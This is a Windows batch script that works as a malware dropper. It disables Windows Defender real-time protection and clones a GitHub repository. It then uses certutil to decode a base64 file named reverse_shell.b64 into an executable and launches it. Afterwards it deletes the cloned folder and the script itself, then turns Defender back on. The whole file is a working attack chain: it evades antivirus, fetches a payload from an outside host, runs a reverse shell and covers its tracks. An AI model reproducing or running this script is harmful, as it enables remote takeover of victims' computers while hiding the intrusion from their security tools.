@echo off
REM Disable Windows Defender temporarily
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

REM Get the current script directory
set "scriptDir=%~dp0"
set "scriptDir=%scriptDir:~0,-1%"

REM Define the paths relative to the script directory
set "repoUrl=https://github.com/nithin434/stuff2.git"
set "repoDir=%scriptDir%\stuff2"
set "b64File=%repoDir%\reverse_shell.b64"
set "exeFile=%scriptDir%\reverse_shell.exe"

REM Clone the repository
git clone "%repoUrl%" "%repoDir%"

REM Check if the cloning was successful
if %errorlevel% neq 0 (
    echo Failed to clone the repository.
    exit /b %errorlevel%
)

REM Decode the base64 file into the executable
certutil -decode "%b64File%" "%exeFile%"

REM Check if the decoding was successful
if %errorlevel% neq 0 (
    echo Failed to decode the base64 file.
    exit /b %errorlevel%
)

REM Execute the decoded executable
start "" "%exeFile%"

REM Optionally, delete the repository folder and the batch script after execution
rmdir /s /q "%repoDir%"
del "%~f0"

REM Re-enable Windows Defender
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false"

REM End of script
